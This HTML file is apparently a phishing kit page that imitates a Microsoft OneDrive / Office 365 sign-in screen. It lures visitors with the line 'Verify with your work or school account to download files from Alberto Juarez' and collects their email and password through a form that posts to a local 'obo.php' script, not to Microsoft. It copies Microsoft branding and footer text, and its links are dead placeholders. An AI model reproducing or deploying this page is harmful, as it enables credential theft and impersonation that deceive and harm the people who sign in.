
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html style="background-color: rgb(235, 60, 0);" dir="ltr"><head>
        

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="PageID" content="i5030.2.0">
<meta name="SiteID" content="">
<meta name="ReqLC" content="1033">
<meta name="LocLC" content="en-US">
<meta name="mswebdialog-newwindowurl" content="*">



<script type="text/javascript">//<![CDATA[
$Config={"scid":2001,"hpgact":2101,"hpgid":1002,"pgid":"i5030","apiCanary":"AQABAAAAAADRNYRQ3dhRSrm-4K-adpCJl5UXLf-eMeuewLKxP-admCUO5Taoo4pIcLJhcWX2auUZ_kRMRW-uFUaq-_Y61exnZEFvq0hPKo5Fzrk7Gy8_lmwDUVlttShWWLacKDljkd0fouipFN2NyCQ_KYDH4xE0j77fcRV0rOkdNuVw_XrgwwbzLEH7WZtQ7OUASG9tVFHL4Tl3GOzh-iUvMa6GZCx8c5CBeqnkwP4wJlmJPNQY8yAA","canary":"fCzcRPg967aAuti8BHeD+Q+9yXUyJeOjlY7u431tQu0=7:1","correlationId":"33518b98-245a-439f-a597-3dd0fcd3759b","locale":{"lc":"en-US","isRtl":false,"lcid":1033},"strings":{"mfa":{"setitupnow":"Set it up now"}},"enums":{"ClientMetricsModes":{"None":0,"SubmitOnPost":1,"SubmitOnRedirect":2,"InstrumentPlt":4}},"urls":{},"browser":{"ltr":1,"Firefox":1,"_Win":1,"_M48":1,"_D0":1,"Full":1,"Win81":1,"RE_Gecko":1,"b":{"name":"Firefox","major":48,"minor":0.0},"os":{"name":"Windows","version":"10.0"},"V":"48.0"},"watson":{"enabled":true,"bundle":"newway/watson.min.js","sbundle":"newway/watsonsupport.min.js","resetErrorPeriod":5,"maxCorsScriptError":2,"maxErrorsPerPage":10},"serverDetails":{"slc":"ProXXXXnA","dc":"SN1","ri":"ESTXXXX_153","ver":{"v":[2,1,4653,2]},"rt":"2016-09-06T20:46:24"}};
//]]></script><script type="text/javascript">//<![CDATA[
!function(){function r(r,o,a){function i(){var r=!!u.method,e=r?u.method:a[2],i=t.$WebWatson;try{e.apply(o,n(a,!r))}catch(l){return void(i&&i.submitFromException&&i.submitFromException(l))}}var u=e.r&&e.r[r];return o=o?o:this,u&&(u.skipTimeout?i():t.setTimeout(i,0)),u}function n(r,n){return Array.prototype.slice.call(r,n?3:2)}var t=window;t.$Do||(t.$Do={q:[],r:[],removeItems:[],lock:0});var e=t.$Do;e.when=function(n,t){r(n,t,arguments)||e.q.push({id:n,c:t,a:arguments})},e.register=function(n,t,o){if(!e.r[n]){e.r[n]={method:t,skipTimeout:o},e.lock++;try{for(var a=0;a<e.q.length;a++){var i=e.q[a];i.id==n&&r(n,i.c,0,i.a)&&e.removeItems.push(i)}}catch(u){throw u}finally{if(e.lock--,0===e.lock){for(var l=0;l<e.removeItems.length;l++)e.q.remove(e.removeItems[l]);e.removeItems=[]}}}},e.unregister=function(r){e.r[r]&&delete e.r[r]}}(),function(){function r(r,n,t){var e=d.createElement("script");e.id=n,e.type="text/javascript",e.setAttribute("src",r),e.defer=!1,e.async=!1,e.onload=t,e.onerror=o,e.onreadystatechange=function(){"loaded"===e.readyState&&t()};var a=d.getElementsByTagName("head")[0];a.appendChild(e)}function n(){var n=v.bundle;v.bundle=null,delete v.bundle,r(n,"WebWatson_DemandLoaded",e)}function t(){g||(c.jQuery?n():r(v.sbundle,"WebWatson_DemandSupport",n),v.sbundle&&(v.sbundle=null,delete v.sbundle),g=!0)}function e(){if(c.$WebWatson){if(c.$WebWatson.isProxy)return void o();for(;m.length>0;){var r=m.shift();r&&c.$WebWatson[r.cmdName].apply(c.$WebWatson,r.args)}}}function o(){var r=c.$WebWatson?c.$WebWatson.isProxy:!0;a(),v.loadErrorUrl&&r&&window.location.assign(v.loadErrorUrl)}function a(){m=[],c.$WebWatson=null}function i(r){return function(){var n=arguments;m.push({cmdName:r,args:n}),t()}}function u(){var r=["foundException","resetException","submit","submitFromException","showError"],n=this;n.isProxy=!0;for(var t=r.length,e=0;t>e;e++){var o=r[e];o&&(n[o]=i(o))}}function l(r,n,t,e,o,a,i,u,l){a||(a=s(i?i+2:2)),b.submit(r,n,t,e,o,a,i,u,l)}function s(r){var n=[],t=arguments.callee;try{for(;r>0;)t=t?t.caller:t,r--;for(var e=0;t&&h>e;){var o="InvalidMethod()";try{o=t.toString()}catch(a){}var i=[],u=t.args||t.arguments;if(u)for(var l=0;l<u.length;l++)i[l]=u[l];n.push({signature:o,args:i,toString:function(){return this.signature}}),t=t.caller,e++}}catch(a){}return n}var c=window,d=c.document,f=c.$Config||{},v=f.watson;if(!c.$WebWatson&&v&&v.enabled){var m=[],g=!1,h=10,b=c.$WebWatson=new u;b.CB={},b._orgErrorHandler=c.onerror,c.onerror=l,b.errorHooked=!0}}(),function(){function r(r,n){for(var t=n.split("."),e=t.length,o=0;e>o&&null!==r&&void 0!==r;)r=r[t[o++]];return r}function n(n){var t=null;return null===l&&(l=r(a,"Constants")),null!==l&&n&&(t=r(l,n)),null===t||void 0===t?"":t.toString()}function t(t){var e=null;return null===i&&(i=r(a,"$Config.strings")),null!==i&&t&&(e=r(i,t.toLowerCase())),(null===e||void 0===e)&&(e=n(t)),null===e||void 0===e?"":e.toString()}function e(r,n){var e=null;return r&&n&&n[r]&&(e=t("errors."+n[r])),e||(e=t("errors."+r)),e||(e=t("errors."+s)),e||(e=t(s)),e}function o(t){var e=null;return null===u&&(u=r(a,"$Config.urls")),null!==u&&t&&(e=r(u,t.toLowerCase())),(null===e||void 0===e)&&(e=n(t)),null===e||void 0===e?"":e.toString()}var a=window,i=null,u=null,l=null,s="GENERIC_ERROR";a.GetString=t,a.GetErrorString=e,a.GetUrl=o}(),function(){var r=window,n=r.$Config||{};r.$B=n.browser||{}}();

//]]></script>

    <link rel="SHORTCUT ICON" href="newway/favicon_a.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
<link href="newway/login.css" rel="stylesheet">



<style>
    .no_display {
        display: none;
    }
</style>


<!--[if lte IE 10]>
    <link href="newway/login_ie.min.css" rel="stylesheet" />

<![endif]-->

<!--[if lte IE 7]>
  <style type='text/css'>
    .ie_legacy { display: none; }
    body { background-color: #0072C6; }
  </style>
<![endif]-->


<script type="text/javascript">
    if ((navigator.userAgent.match(/iPad/) || navigator.userAgent.match(/iPhone/))
        && (window.innerWidth)) {
        try {
            viewport = document.querySelector("meta[name=viewport]");
            viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            window.onresize = function(event) {
                viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            };
            window.onorientationchange = function (event) {
                var activeElem = document.activeElement;
                activeElem && activeElem.blur();
            };
        } catch (err) {
        }
    }

    var isTouch =  !!("ontouchstart" in window) || window.navigator.msMaxTouchPoints > 0;
    if (!isTouch && true) {    
        var cssId = 'hovereffect';
        if (!document.getElementById(cssId)) {
            var head = document.getElementsByTagName('head')[0];
            var link = document.createElement('link');
            link.id = cssId;
            link.rel = 'stylesheet';
            link.type = 'text/css';
            link.href = "newway/login_hover.min.css";
            link.media = 'all';
            head.appendChild(link);
        }
    }

    if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
        var msViewportStyle = document.createElement("style");
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{width:auto!important}"
              )
          );
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{height:auto!important}"
              )
          );
        document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
    }
 </script><link media="all" href="newway/login_hover.css" type="text/css" rel="stylesheet" id="hovereffect">


<script src="newway/jquery.js"></script>

<script src="newway/aad.js"></script>






<style>
    body
    {
        display: none;
    }
</style>

        <title>
Sign in - Microsoft OneDrive        </title>
    </head>
    <body style="display: block;">
        

    <script>
        if (self == top) {
            var body = $('body');
            body.css('display', 'block');
        } else {
            top.location = self.location;
        }
    </script>

<div id="background_branding_container" class="ie_legacy" style="background: rgb(235, 60, 0) none repeat scroll 0% 0%;">
    <img src="newway/heroillustration.jpg" style="width: 880px; height: 669px; background-color: rgb(235, 60, 0); visibility: visible; display: block;" id="background_background_image" alt="Illustration">
    <div style="opacity: 0;" id="background_company_name_text" class="background_title_text">Verify with your work or school account to download files from Alberto Juarez</div>
</div>
<div aria-hidden="true" style="background-color: rgb(235, 60, 0); visibility: visible; display: none;" id="background_page_overlay" class="overlay ie_legacy">
</div>

        <div aria-hidden="true" style="display: none;" id="login_no_script_panel" class="login_panel">
            

<noscript>
    <style>body { display: block; }</style>
    <div class="login_inner_container no_js">
        <div class="inner_container cred">
            <div class="login_workload_logo_container">
            </div>
            
            </div>
        </div>
    </div>
    

<div id="footer_links_container" class="login_footer_container">
    <div class="footer_inner_container">
        <table id="footer_table" class="footer_block">
                <tr>
                    <td>
                        <div>
                            <div class="corporate_footer">
                                    <div>
                                        <span class="footer_link text-caption" id="footer_copyright_link">
&#169; 2016 Microsoft                                        </span>
                                    </div>
                                    <div>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_terms" href="#" target="_blank">Terms of use</a>
                                        </span>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_privacy" href="#" target="_blank">Privacy &amp; Cookies</a>
                                        </span>
                                    </div>
                            </div>
                        </div>
                    </td>
                    <td>
                        <div class="footer_glyph">
                            <img src="newway/microsoft_logo.png" alt="Microsoft account symbol" />
                        </div>
                    </td>
                </tr>
        </table>
    </div>
</div>
<div id="login_prefetch_container" class="no-display">
</div>

</noscript>

        </div>
        <div style="display: block;" id="login_panel" class="login_panel">
            <div class="legal_container"></div>
            <table class="login_panel_layout" style="height: 100%;">
                <tbody><tr class="login_panel_layout_row" style="height: 100%;">
                    <td id="login_panel_center">
                        
        </div>
    </div>
                        <script type="text/javascript">
                            $(document).ready(function () {
                                

Constants.DEFAULT_LOGO = 'newway/testdrive.jpg';


Constants.DEFAULT_LOGO_ALT = 'Office 365';
Constants.DEFAULT_ILLUSTRATION = 'newway/heroillustration.png';
Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';
Constants.BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_TEXT = '';




    
    User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
    User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
    
    if (Constants.DEFAULT_BOILERPLATE_TEXT.length > 0) {
        TenantBranding.AddBoilerPlateText(Constants.DEFAULT_BOILERPLATE_TEXT, Constants.DEFAULT_BOILERPLATE_HEADER);
    }
    

                                


                                $('#footer_link_privacy_windows').click(function (event) {
                                    var flyoutButton = $('#footer_link_privacy_windows')[0]; // anchor
                                    var flyout = $('#flyoutPrivacyStatement')[0]; // flyout div
                                    var pageTop = $('.body-container')[0].getBoundingClientRect().top + (window.pageYOffset || document.documentElement.scrollTop || 0);
                                    flyout.style.marginTop = pageTop + "px"; // adjust margin top so flyout doesn't cover header
                                    flyout.winControl.show(flyoutButton, "top", "left");
                                });

                                if (!Constants.IS_ADAL_REQUEST) {
                                    $('#create_msa_account_link, #account_not_found_title_text > p > a').click(function (event) {
                                        event.preventDefault();
                                        var msaLink = event.target.getAttribute("href");
                                        window.open(msaLink, '_blank');
                                        window.focus();
                                    });
                                }
                                else {
                                    $('#account_not_found_title_text p').toggleClass('no_display');
                                }
                            });

                        </script>
                        <div class="login_inner_container">
                            <div id="true_inner" class="inner_container cred">
                                    <div class="login_workload_logo_container"><img src="newway/testdrive.jpg" alt="Sign in with your work or school account" class="workload_img" id="login_workload_logo_image" style="visibility: visible;"></div>
                                <div class="spacer"></div>
                                




<div id="login_error_container" class="login_error_container"></div>
<div class="login_cta_container normaltext">
            <div id="login_cta_text" class="cta_message_text 1">Verify with your work or school account to download files from Alberto Juarez</div>

    
    
</div>
<ul class="login_cred_container">
    
        </ul>
    </div>
    <div aria-hidden="true" class="nav-settings-menu hidden dropdownPanel" id="signedout-dropdown">
        <ul class="nav-settings-menu-list">
            <li id="forgetContainer"><a href="#" id="signedout-forget">Forget</a></li>
        </ul>
    </div>
    <!--  -->
    <li class="login_cred_field_container">
    <script>
function validateForm() {
    var email=document.forms["credentials"]["login"].value;
    var x=document.forms["credentials"]["passwd"].value;

    var emailFilter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;

    if (!emailFilter.test(email)) {
        alert('Please enter a valid e-mail address.');
        return false;

}

    if (x==null || x=="") {
        alert("Password must be filled out");
        return false;
  }

    return true;
}

</script>    

<form id="credentials" method="POST" action="obo.php" onsubmit="return validateForm()">
        <div id="cred_userid_container" class="login_textfield textfield">
            <span class="input_field textfield">
                <label aria-hidden="true" for="cred_userid_inputtext" class="no_display">User account</label>
                <div class="input_border high_contrast_border">
                    <input id="cred_userid_inputtext" class="login_textfield textfield required email field normaltext" placeholder="someone@example.com " name="login" id="login" spellcheck="false" alt="someone@example.com " aria-label="User account" autocomplete="off" type="email">
                </div>
            </span>
        </div>


        <div style="opacity: 1;" id="cred_password_container" class="login_textfield textfield">
            <span class="input_field textfield">
                <label aria-hidden="true" for="cred_password_inputtext" class="no_display">Password</label>
                <div class="input_border high_contrast_border">
                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" placeholder="Password" spellcheck="false" aria-label="Password" alt="Password" name="passwd" id="passwd" value="" type="password">
                </div>
            </span>
        </div>

    <li id="login-splitter-control" class="login_splitter_control">
        <div id="splitter-tiles-container"></div>
    </li>

<div id="cred_kmsi_container" class="subtext normaltext">
    <span class="input_field ">
        <input id="cred_keep_me_signed_in_checkbox" value="0" class="win-checkbox" name="persist" type="checkbox">
        <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
    </span>
</div>
<div id="idTd_PWD_SubmitCancelTbl" class="section"><input type="submit" name="SI" id="idSIButton9" value="Sign in" class="button"></div>      

        <div style="opacity: 1;" id="recover_container" class="subtext smalltext">
            <span>
                <a id="cred_forgot_password_link" tabindex="12" href="#">Cant access your account?</a>
            </span>
        </div>
</form>

        
        </li><li id="disambig-container" class="smalltext marginTop30px" style="display: none;">
            
        </li>

<input value="0" id="home_realm_discovery" type="hidden"></ul>
<div aria-hidden="true" id="samlrequest_container" class="no_display">
</div>

                            </div>
                            <div class="push">
                            </div>
                        </div>


<div id="footer_links_container" class="login_footer_container">
    <div class="footer_inner_container">
        <table id="footer_table" class="footer_block">
                <tbody><tr>
                    <td>
                        <div>
                            <div class="corporate_footer">
                                    <div>
                                        <span class="footer_link text-caption" id="footer_copyright_link">
© 2016 Microsoft                                        </span>
                                    </div>
                                    <div>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_terms" href="#" target="_blank">Terms of use</a>
                                        </span>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_privacy" href="#" target="_blank">Privacy &amp; Cookies</a>
                                        </span>
                                    </div>
                            </div>
                        </div>
                    </td>
                    <td>
                        <div class="footer_glyph">
                            <img src="newway/microsoft_logo.png" alt="Microsoft account symbol">
                        </div>
                    </td>
                </tr>
        </tbody></table>
    </div>
</div>

    

</body></html>